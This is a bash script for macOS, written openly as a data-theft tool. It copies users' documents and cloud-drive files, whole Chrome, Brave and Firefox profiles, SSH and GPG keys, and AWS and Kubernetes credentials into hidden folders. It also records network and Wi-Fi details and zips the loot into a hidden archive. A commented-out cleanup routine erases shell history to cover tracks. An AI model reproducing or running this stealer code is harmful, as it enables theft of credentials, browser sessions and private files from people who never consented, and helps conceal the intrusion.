#!/bin/bash

hidden_dir="$HOME/.sys"
stor_dir="$HOME/.s"

if [ ! -d "$hidden_dir" ] ; then
   mkdir -p "$hidden_dir"
fi

if [ ! -d "$stor_dir" ] ; then
   mkdir -p "$stor_dir"
fi

exfil_files() {
  mkdir -p "$hidden_dir/files"
  for src_dir in ~/Desktop ~/Documents ~/Downloads; do
    find "$src_dir" -type f \( -name "*.doc" -o -name "*.docx" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.ppt" -o -name "*.pdf" -o -name "*.csv" -o -name "*.odt" \) -exec rsync -a --relative {} "$hidden_dir/files/" \; &> /dev/null
  done
  
  loot_pid=$!
}

exfil_cloud() {
  mkdir -p "$hidden_dir/cloud_files"
  if [ -d "$HOME/Dropbox" ]; then
    cd "$HOME/Dropbox"
    find ./ -type f \( -name "*.doc" -o -name "*.docx" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.ppt" -o -name "*.pdf" -o -name "*.csv" -o -name "*.odt" \) -exec rsync -a --relative {} "$hidden_dir/cloud_files/" \; &> /dev/null
  fi

  google_drive_path="$HOME/Library/CloudStorage/$(ls ~/Library/CloudStorage)"
  if [ -d "$google_drive_path" ]; then
    cd "$google_drive_path"
    cd My\ Drive
    find ./ -type f \( -name "*.doc" -o -name "*.docx" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.ppt" -o -name "*.pdf" -o -name "*.csv" -o -name "*.odt" \) -exec rsync -a --relative {} "$hidden_dir/cloud_files/" \; &> /dev/null
  fi
}

exfil_browsers() {
  mkdir -p "$hidden_dir/browsers"

  cp -r "$HOME/Library/Application Support/Google/Chrome" "$hidden_dir/browsers/" &>/dev/null
  cp -r "$HOME/Library/Application Support/BraveSoftware/Brave-Browser" "$hidden_dir/browsers/" &>/dev/null
  cp -r "$HOME/Library/Application Support/Firefox" "$hidden_dir/browsers/" &>/dev/null

  exfil_browser_pid=$!
  
}

network_details() {
  mkdir -p "$hidden_dir/network"
  networksetup -getinfo Wi-Fi >> "$hidden_dir/network/wifi_ip.txt"
  ifconfig >> "$hidden_dir/network/ifconfig.txt"
  arp -a >> "$hidden_dir/network/arp.txt"
  networksetup -listpreferredwirelessnetworks en0 | awk 'NR>1 {print $1}' >> "$hidden_dir/network/saved_wifi_ssid.txt"
  lsof -Pn -i4 | grep LISTEN >> $hidden_dir/network/listening_ports.txt

  for ext_net in ip city region country loc org postal timezone; do
    echo " $ext_net - $(curl -s https://ipinfo.io/$ext_net)" >> "$hidden_dir/network/external_net"
  done
}

exfil_bt() {
  system_profiler SPBluetoothDataType >> "$hidden_dir/network/bluetooth.txt"
}

exfil_keys() {
  mkdir -p "$hidden_dir/keys"
  cp -r ~/.ssh  $hidden_dir/keys/ &> /dev/null
  cp -r ~/.gnupg $hidden_dir/keys/ &> /dev/null
}

exfil_fs() {
  df -h > $hidden_dir/configs/df.txt
}

exfil_apps() {
  ls /Applications
}

exfil_config() {
  mkdir -p "$hidden_dir/configs"
  config_files=( ".configi*"
                 ".bash*"
                 "*vim*"
                 ".git"
                 "*.zsh*"
                 "*.conf*"
                 "*.config"
                 ".aws*"
                 ".kube*"
               )

  for files in "~/${config_files[@]}"; do
    cp -r $HOME/$files "$hidden_dir/configs/" &> /dev/null
  done
}

exfil_compress() {
  mkdir -p "$stor_dir"
  cd "$stor_dir"
  zip -5 -r .l.oo.t.zip "$hidden_dir" 2>/dev/null &> /dev/null

  compress_pid=$!
}

cleanup() {
  rm -rf "$hidden_dir"
  rm -rf "$stor_dir"
  echo > ~/.zsh_history
}


exfil_files &
exfil_cloud &
exfil_browsers &
exfil_config &

network_details
exfil_bt
exfil_keys

wait $exfil_files_pid $exfil_browsers_pid
exfil_compress

#wait $exfil_compress
#cleanup

